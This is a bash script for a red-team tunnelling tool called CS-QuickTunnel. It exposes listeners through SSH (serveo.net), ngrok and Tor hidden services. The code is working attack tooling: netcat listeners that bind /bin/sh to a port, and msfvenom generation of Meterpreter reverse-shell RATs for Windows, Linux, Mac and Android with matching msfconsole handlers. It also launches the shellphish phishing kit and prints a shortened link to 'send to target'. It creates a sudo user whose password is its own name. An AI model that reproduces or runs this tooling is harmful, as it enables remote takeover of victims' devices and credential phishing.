#!/bin/bash
# CS-QuickTunnel v0.5.1
# Coded by: Cyber Secrets - Information Warfare Center
# Tool for Red Team ops
# Github: https://github.com/infosecwriter/CS-QuickTunnel
# This script uses some Phishing Pages generated by shellphish Github https://github.com/thelinuxchoice/shellphish
# This script create tunnels including SSH, Ngrok, and Tor that maps back to you locally
# Current shells supported are RAW, NetCat, and Metasploit/Meterpreter

trap 'printf "\n";stop;exit 1' 2
clear

startmenu() {
	default_port="12345"
	default_server="serveo.net"
	printf "\e[92m  SSH Tunneling                                              =  1\n"
	printf "  NGROK Tunneling                                            =  2\n"
	if command -v tor > /dev/null 2>&1; then
		printf "  TOR Tunneling                                              =  3\n"
	fi
	printf "  Check Dependencies                                         =  9\n"
	printf "  Run Shellphish @thelinuxchoice                             = 10\n"
	printf "  Exit                                                       = 99\n"
	printf "\n"
	read -p $'  Choose an option: \e[37;1m' option
	case $option in
		99)      
			stop 1
			;;
		1|01)      
			banner
			menussh
			;;
		2|02)
			ngrokme		
			banner
			menungrok
			;; 
		3|03)
			banner
			menutor
			;;
		9|09)
			printf "\e[93mChecking dependencies"
			apt update | tee -a dep.log
			command -v unzip > /dev/null 2>&1 || { apt install unzip | tee -a dep.log; }
			command -v wget > /dev/null 2>&1 || { apt install wget | tee -a dep.log; }
			command -v curl > /dev/null 2>&1 || { apt install curl | tee -a dep.log; }
			command -v tor > /dev/null 2>&1 || { apt install tor | tee -a dep.log; }
			command -v netcat > /dev/null 2>&1 || { apt install netcat | tee -a dep.log; }
			command -v cryptcat > /dev/null 2>&1 || { apt install cryptcat | tee -a dep.log; }
			command -v php > /dev/null 2>&1 || { apt install php | tee -a dep.log; }
			command -v apparmor-utils > /dev/null 2>&1 || { apt install apparmor-utils | tee -a dep.log; }
			command -v bleachbit > /dev/null 2>&1 || { apt install bleachbit | tee -a dep.log; }
			if [[ -e ngrok ]]; then
				ngrokme
			fi
			printf "\e[93mChecking done.  Review the above logs for potential issues.\n If dependencies are not configured properly, tunnels will NOT work\n\nPress enter when done"
			read depme
			banner
			startmenu
			;; 
		10)
			rm -rf shellphish
			git clone https://github.com/thelinuxchoice/shellphish
			cd shellphish
			clear
			bash shellphish.sh
			banner; startmenu
			;;
  		*)
		printf "\e[1;93m [!] Invalid option!\e[0m\n"
		clear
		banner
		startmenu
		;;
	esac
}

menussh() {
	default_port="12345"
	default_server="serveo.net"
	printf "\e[92m  Just port forward                                          =  1\n"
	printf "  Run a NetCat listener                                      =  2\n"
	printf "  Run a NetCat listener reverse conect                       =  3\n"
	printf "  Run PHP Server Through Serveo.net                          = 10\n"
	if command -v msfconsole > /dev/null 2>&1; then
		printf "  Run a Metasploit Meterpreter (Windows) listener            = 21\n"
		printf "  Run a Metasploit Meterpreter (Linux) listener              = 22\n"
		printf "  Run a Metasploit Meterpreter (Mac) listener                = 23\n"
		printf "  Run a Metasploit Meterpreter (Android) listener            = 24\n"
	fi
	printf "  Exit                                                       = 99\n"
	printf "\n"

	read -p $'  Choose an option: \e[37;1m' option
	if [[ $option == 99 ]]; then 
		banner
		startmenu
	fi
	printf '\e[92mChoose a local listening port (Example:12345)\e[37;1m: ' $default_port
	read lport; lport="${lport:-${default_port}}"
	printf '\e[92mChoose a remote port on SSH server (Example:12345)\e[37;1m: ' $default_port
	read rport; rport="${rport:-${default_port}}"
	printf '\e[92mChoose a remote server (Example: serveo.net)\e[37;1m: ' $default_server
	read rserver; rserver="${rserver:-${default_server}}"
	case $option in
		1|01)      
			printf "\e[1;93m [!] Forwarding local port "$lport" to the "$remote" server!\e[0m\n"
			serveoitforward
			;;
		2|02)      
			banner
			startmenu
			;;
		3|03)      
			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
			nc -l -p $lport -e /bin/sh > /dev/null 2>&1 &
			serveoitforward
			;;
		10)      
			serveserveo
			banner
			startmenu
			;;
	# Metasploit
		21)      
			payload="windows/meterpreter/reverse_tcp"
			platform="-a x86 --platform windows"
			filetype="-f exe"
			fileext="exe"
			OSType="Windows"
			MetasploitMe
			serveoitforward
			;;
		22)      
			payload="linux/x86/meterpreter/reverse_tcp"
			platform=""
			filetype="-f elf"
			fileext="elf"
			OSType="Linux"
			MetasploitMe
			serveoitforward
			;;
		23)      
			payload="osx/x86/shell_reverse_tcp"
			platform=""
			filetype="-f macho"
			fileext="macho"
			OSType="Mac"
			MetasploitMe
			serveoitforward
			;;
		24)      
			payload="android/meterpreter/reverse_tcp"
			platform=""
			filetype="R"
			fileext="apk"
			OSType="Android"
			MetasploitMe
			serveoitforward
			;;
		*)
		printf "\e[1;93m [!] Invalid option!\e[0m\n"
		sleep
		clear
		banner
		menussh
		;;
	esac

}

menungrok() {
	default_port="12345"
	printf "\e[92m  Just port forward through Ngrok.io                         =  1\n"
	printf "  Run a NetCat listener                                      =  2\n"
	printf "  Run a NetCat listener reverse conect                       =  3\n"
	printf "  Run PHP Server Through Ngrok.io                            = 10\n"
	if command -v msfconsole > /dev/null 2>&1; then
		printf "  Run a Metasploit Meterpreter (Windows) listener            = 21\n"
		printf "  Run a Metasploit Meterpreter (Linux) listener              = 22\n"
		printf "  Run a Metasploit Meterpreter (Mac) listener                = 23\n"
		printf "  Run a Metasploit Meterpreter (Android) listener            = 24\n"
	fi
	printf "  Exit                                                       = 99\n"
	printf "\n"
	read -p $'  Choose an option: \e[37;1m' option
	if [[ $option == 99 ]]; then 
		banner
		startmenu
	fi
	printf 'Choose a local listening port (Example:12345): ' $default_server
	read lport
	lport="${lport:-${default_port}}"
	case $option in
		1|01)      
			printf "\e[1;93m [!] Forwarding local port "$lport" to the "$lport" server!\e[0m\n"
			ngrokitforward
			;;
		2|02)      
			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
			nc -l -p $lport -e /bin/sh > /dev/null 2>&1 &
			ngrokitforward
			;;
		3|03)      
			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
			nc -lvp $lport -e /bin/sh > /dev/null 2>&1 &
			ngrokitforward
			;;
		10)      
			printf "\e[1;93m [!] Starting PHP Server on port: "$lport"!\e[0m\n"
			servengrok
			;;
	# Metasploit
		21)      
			payload="windows/meterpreter/reverse_tcp"
			platform="-a x86 --platform windows"
			filetype="-f exe"
			fileext="exe"
			OSType="Windows"
			MetasploitMe
			ngrokitforward
			;;
		22)      
			payload="linux/x86/meterpreter/reverse_tcp"
			platform=""
			filetype="-f elf"
			fileext="elf"
			OSType="Linux"
			MetasploitMe
			ngrokitforward
			;;
		23)      
			payload="osx/x86/shell_reverse_tcp"
			platform=""
			filetype="-f macho"
			fileext="macho"
			OSType="Mac"
			MetasploitMe
			ngrokitforward
			;;
		24)      
			payload="android/meterpreter/reverse_tcp"
			platform=""
			filetype="R"
			fileext="apk"
			OSType="Android"
			MetasploitMe
			ngrokitforward
			;;
		*)
		printf "\e[1;93m [!] Invalid option!\e[0m\n"
		sleep
		clear
		banner; menungrok
		;;
	esac

}

menutor() {
	default_port="12345"
	default_server="serveo.net"
	printf "\e[92m  Tor Hidden Service - Port Forwarding (You run a service)   =  1\n"
	printf "  Show Tor Hidden Service .onion Address                     =  2\n"
	printf "  Add User & Install Tor Browser                             =  7\n"
	printf "  Reset .onion Address                                       =  8\n"
	printf "  Remove User & Tor Browser                                  =  9\n"
	printf "  Tor Hidden Service - PHP Web Server                        = 10\n"
	printf "  Exit                                                       = 99\n"
	printf "\n"
	read -p $'  Choose an option: \e[37;1m' option
	printf "\n"
	if [[ $option == 99 ]]; then 
		banner
		startmenu
	fi
	case $option in
		1|01)      
			banner
			toritforward
			;;
		2|02)      
			systemctl restart tor
			if [[ -e /var/lib/tor/myservices/hostname ]]; then
				hostname=$(cat /var/lib/tor/myservices/hostname)
				printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Tor hidden service hostname is: \e[37;1m$hostname\n\n\n"
			else
				printf "\e[91mNo .onion address found\n\n\n"
			fi
			printf "\e[92mPress ENTER to continue"; read me
			banner
			menutor
			;;
		7|07)      
			systemctl restart tor
			torview
			banner
			menutor
			;;
		8|08)      
			printf "\e[93mAre you sure?  This can't be reversed without a backup. UPPER CASE 'Y' to delete: "; read me
			printf $me
			if [[ $me == "Y" ]]; then
				hostname=""
				rm -rf /var/lib/tor/myservices
				systemctl restart tor; sleep 5
			else
				printf "\e[91mNo change to .onion address"; sleep 3	
			fi
			hostname=$(cat /var/lib/tor/myservices/hostname)
			printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Tor hidden service hostname is: \e[37;1m$hostname\n\n\n"; sleep 5
			banner
			menutor
			;;
		9|09)      
			systemctl stop tor
			tordeview
			systemctl start tor
			banner
			menutor	
			;;
		10)      
			printf "\e[1;93m [!] Starting PHP Server on port \e[37;1m"$lport"!\n"
			banner
			servetor
			;;
		*)
		printf "\e[1;93m [!] Invalid option!\e[0m\n"
		sleep 1
		clear
		banner
		menutor
		;;
	esac
}

MetasploitMe() {
	read -p $'\e[92mChoose RAT name with ".'$fileext'" extention: ' pname
	printf "\e[1;93m [!] Starting Metasploit Meterpreter ($OSType) listener on port "$lport"!\e[0m\n"
	rm -rf reverse-connect.sh
	echo 'msfconsole -x "use exploit/multi/handler; set payload '$payload'; set LPORT '$lport'; set LHOST 127.0.0.1; run;"' > reverse-connect.sh
	printf "\e[1;93m [!] To create a meterpreter RAT, RUN \n msfvenom $platform -p $payload LHOST=$rserver LPORT=$rport $file > $pname\n"
	printf " \e[92mCopy "$pname" to the remote $OSType system \n Then run "$pname"!\n"
	mkdir site/installs > /dev/null 2>&1
	service postgresql stop > /dev/null 2>&1
	service postgresql start > /dev/null 2>&1
	printf "\e[92mCreating RAT locally, located in the ./site/installs/ folder\n"
	msfvenom $platform -p $payload LHOST=$rserver LPORT=$rport $filetype > site/installs/$pname
	chmod +x site/installs/$pname
	chmod +x reverse-connect.sh
	printf "Starting Metasploit with $payload listener..."
	xterm ./reverse-connect.sh &

}

ngrokme() {
	if [[ -e ngrok ]]; then
		printf "Installed...\n"
	else
		printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
		wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
		if [[ -e ngrok-stable-linux-386.zip ]]; then
			unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
			chmod +x ngrok
			rm -rf ngrok-stable-linux-386.zip
		else
			printf "\e[91m[!] Download error... \n"
			exit 1
		fi
	fi
}

torview() {
	# Installing Tor browser
	torhostname="$hostname:$lport"
	printf "\e[93m  Testing the address through a the Tor Browser Bundle...  \n   Please be patient...\n   This may take a few minutes...\n"
	toruser=`cat /etc/passwd | grep -i "kalitor:" | cut -d ":" -f 1`
	if [[ $toruser == "kalitor" ]]; then
		printf "   User found\n"
	else
		useradd -m kalitor -G sudo -s /bin/bash && echo -e "kalitor\nkalitor\n" | passwd kalitor
		xhost si:localuser:kalitor
	fi
	if [[ -e /home/kalitor/tor-browser_en-US/start-tor-browser.desktop ]]; then
		# Stalling while route is built to Tor2Web
		tortimex=0
		while [ $tortimex != 30 ]
		do
			sleep 1
			printf "|"
			let tortimex++
		done
		curdir=$(pwd)
		cd /home/kalitor/tor-browser_en-US/
		printf "\n"; sudo -u kalitor -H ./start-tor-browser.desktop $torhostname $torhostname/installs.php
		cd $curdir

	else
		printf "\e[93m Downloading the Tor Browser for ease of use"
		rm tor-browser-linux64-8.0.3*
		wget https://www.torproject.org/dist/torbrowser/8.0.3/tor-browser-linux64-8.0.3_en-US.tar.xz
		chown kalitor tor-browser-linux64-8.0.3_en-US.tar.xz
		curdir=$(pwd)
		sudo -u kalitor -H tar -xvJf tor-browser-linux64-8.0.3_en-US.tar.xz -C /home/kalitor/
		cd /home/kalitor/tor-browser_en-US/
		sudo -u kalitor -H ./start-tor-browser.desktop $torhostname $torhostname/installs.php
		cd $curdir
	fi
}

tordeview() {
	# Kill user & Un-Installing Tor browser
	killall -u kalitor
	deluser kalitor	
	rm -rf /home/kalitor
	# bleachbit -c --preset
	banner
	menutor
}

toritforward() {
	# Port forwarding with Tor.  You run the server locally.  We just add the config
	aa-complain system_tor
	systemctl restart tor
	printf '\e[92mChoose a listening port (Example:12345): \e[37;1m' $default_port
	read lport
	lport="${lport:-${default_port}}"
	sleep 2
	printf "\e[1;93m [!] Starting Tor Hidden Server on port "$lport"!\e[0m\n"
	if (grep -Fxq "HiddenServiceDir /var/lib/tor/myservices/" /etc/tor/torrc); then
	    sleep 1
	else
	    echo "HiddenServiceDir /var/lib/tor/myservices/" >> /etc/tor/torrc
	fi
	if (grep -Fxq "HiddenServicePort $lport 127.0.0.1:$lport" /etc/tor/torrc); then
	    sleep 1
	else
	    echo "HiddenServicePort $lport 127.0.0.1:$lport" >> /etc/tor/torrc
	fi
	sed -i 's/#SocksPolicy\ reject\ \*/SocksPolicy\ accept\ \*/g' /etc/tor/torrc
	killall tor		
	systemctl restart tor 
	systemctl status tor
	journalctl -b --no-pager | grep -i tor | tail -n40 | grep -i warn
	printf "\nSetting up Tor hidden service... \n\n"
	eip="curl ipinfo.io/ip"
	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Your external IP address is: \e[37;1m"
	$eip
	tip="torsocks curl ipinfo.io/ip"
	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Your external IP address is: \e[37;1m" 
	$tip
	if [[ $eip == $tip ]]; then
		printf "\e[31;1mTOR FAILED.  IPs are the SAME!!!"
		printf "\e[31;1mMake sure your ISP or network isn't blocking Tor.  Press Enter for menu\e[92m"
		read me
	fi	
	hostname=$(cat /var/lib/tor/myservices/hostname)
	printf "Here is the path to fortune: \e[37;1m$hostname:$lport"
	read me
	banner
	menutor
}

ngrokitforward() {
	printf "\e[92mStarting NGROK tunnel...\e[0m\n"
	./ngrok tcp $lport > /dev/null 2>&1 &
	sleep 5
	rport=$(curl -s -N http://127.0.0.1:4040/status | grep -o "tcp.ngrok.io:[0-9].\{4\}" | cut -d ":" -f 2) 
	rserver="tcp.ngrok.io"
	printf "\e[1;92m[\e[0m*\e[1;92m] Your new server:\e[0m\e[1;77m %s\e[0m\n" $rserver:$rport
	printf "\e[1;92m[\e[0m*\e[1;92m] Opening with NetCat to test port \e[0m\e[1;77m %s\e[0m\n"
	echo 'nc '$rserver $rport > reverse-ngrok-connect.sh
	chmod +x reverse-ngrok-connect.sh
	xterm ./reverse-ngrok-connect.sh &	
	printf "\e[92mPress enter to return to main menu or CTRL+C to end session\n"
	read waitforngrok
}

serveoitforward() {
	if [[ $OSType == "Linux" ]]; then
		read -p $"\nWould you like to test the Linux RAT? (Y)" testme 
		if [[ $testme == "y" || $testme == "Y" ]]; then
			echo "./site/installs/$pname" > testme.sh
			bash testme.sh &
		fi
	fi
	printf "\e[92mStarting tunnel...\e[0m\n"
	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $rport:localhost:$lport $rserver
	banner; menussh
}

serveserveo() {
	# SHELLPHISH, AUTHOR: @thelinuxchoice
	printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
	cd site && php -S 127.0.0.1:$lport > /dev/null 2>&1 & 
	sleep 2
	printf "\e[92mStarting server...\e[0m\n"
	command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
	if [[ -e sendlink ]]; then
		rm -rf sendlink
	fi
	$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$lport' serveo.net 2> /dev/null > sendlink ' &
	printf "\n"
	sleep 10
	send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
	printf "\n"
	printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
	send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
	printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
	printf "\n"
	firefox $send_link $send_link/installs.php
}

servengrok() {
	ngrokme
	printf "\e[92mStarting PHP server...\n"
	cd site && php -S 127.0.0.1:$lport > /dev/null 2>&1 & 
	sleep 2
	printf "\e[92mStarting ngrok server...\n"
	./ngrok http $lport > /dev/null 2>&1 & sleep 10 && link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
	printf "\e[92mYour new server: \e[37;1m$link\n" 
	printf "\e[92mOpening with Firefox in 3 seconds\n"
	sleep 3 
	firefox $link $link/installs.php
	printf "\e[92mPress enter to return to main menu or CTRL+C to end session\n"
	read waitforngrok
	banner
	startmenu
}

servetor() {
	aa-complain system_tor
	systemctl restart apparmor
	systemctl restart tor
	printf '\e[92mChoose a listening port (Example:12345): \e[37;1m' $default_port
	read lport
	lport="${lport:-${default_port}}"
	printf "\n\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
	cd site && php -S 127.0.0.1:$lport > /dev/null 2>&1 & 
	sleep 2
	printf "\e[1;93m [!] Starting Tor Hidden Server on port "$lport"!\e[0m\n"
	if (grep -Fxq "HiddenServiceDir /var/lib/tor/myservices/" /etc/tor/torrc); then
	    sleep 1
	else
	    echo "HiddenServiceDir /var/lib/tor/myservices/" >> /etc/tor/torrc
	fi
	if (grep -Fxq "HiddenServicePort $lport 127.0.0.1:$lport" /etc/tor/torrc); then
	    sleep 1
	else
	    echo "HiddenServicePort $lport 127.0.0.1:$lport" >> /etc/tor/torrc
	fi
	if (grep -Fxq "HTTPTunnelPort 0.0.0.0:9080" /etc/tor/torrc); then
	    sleep 1
	else
	    echo "HTTPTunnelPort 0.0.0.0:9080" >> /etc/tor/torrc
	fi
	sed -i 's/#SocksPolicy\ reject\ \*/SocksPolicy\ accept\ \*/g' /etc/tor/torrc
	killall tor		
	systemctl restart tor 
	sleep 10
	journalctl -b --no-pager | grep -i tor | tail -n40 | grep -i warn
	printf "\n\e[92mSetting up Tor hidden service... \n"
	eip="curl ipinfo.io/ip"
	printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Your external Internet IP address is: \e[37;1m"
	$eip
	tip="torsocks curl ipinfo.io/ip"
	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Your Torified external IP address is: \e[37;1m"
	$tip
	if [[ $eip == $tip ]]; then
		printf "\e[91mTOR FAILED.  IPs are the SAME!!!"
		printf "\e[91mMake sure your ISP or network isn't blocking Tor.  Press Enter for menu\e[92m"
		read me
	fi	
	hostname=$(cat /var/lib/tor/myservices/hostname)
	torview
	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Tor hidden service hostname is: $hostname\n\n"
	printf "   You can connect to your new PHP Webserver using: \n    \e[37;1m> http://$hostname:$lport throught Tor\n\n\e[92m"
	printf "   You can connect to your new PHP Webserver using: \n    \e[37;1m> http://$hostname.to:$lport throught the Internet\n\n\e[92m"
	printf "If the page doesn't load, wait a minute and try again...\n\nPress enter to return to main menu or CTRL+C to end session"
	
	read waitfortor
	banner
	menutor
}

stop() {
	printf "\nCleaning up services\n"
	checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
	checkphp=$(ps aux | grep -o "php" | head -n1)
	checkssh=$(ps aux | grep -o "ssh" | head -n1)
	checktor=$(ps aux | grep -o "tor" | head -n1)
	if [[ $checkngrok == *'ngrok'* ]]; then
		pkill -f -2 ngrok > /dev/null 2>&1
		killall -2 ngrok > /dev/null 2>&1
	fi
	if [[ $checkphp == *'php'* ]]; then
		pkill -f -2 php > /dev/null 2>&1
		killall -2 php > /dev/null 2>&1
	fi
	if [[ $checkssh == *'ssh'* ]]; then
		pkill -f -2 ssh > /dev/null 2>&1
		killall ssh > /dev/null 2>&1
	fi
	if [[ $checktor == *'tor'* ]]; then
		pkill -f -2 tor > /dev/null 2>&1
		killall tor > /dev/null 2>&1
	fi
	killall xterm > /dev/null 2>&1
	killall -u kalitor
	rm -rf reverse-connect.sh > /dev/null 2>&1
	rm -rf reverse-ngrok-connect.sh > /dev/null 2>&1
	exit 1
}
	
banner() {
	clear
	printf "\n"
	printf "\e[1;93m    .:.:.\e[0m\e[1;77m Quick Tunneling tool coded by: @InfoSecWriter   \e[0m\e[1;93m.:.:.\e[0m\n"
	printf "\e[1;93m    .:.:.\e[0m\e[1;77m https://github.com/infosecwriter/CS-QuickTunnel \e[0m\e[1;93m.:.:.\e[0m\n"
	printf "\e[1;93m    .:.:.\e[0m\e[1;77m CyberSecrets.org : IntelligentHacking.com       \e[0m\e[1;93m.:.:.\e[0m\n"
	printf "\n"
	printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
	printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused...            ::\e[0m\n"
	printf "\n"
}

banner
startmenu

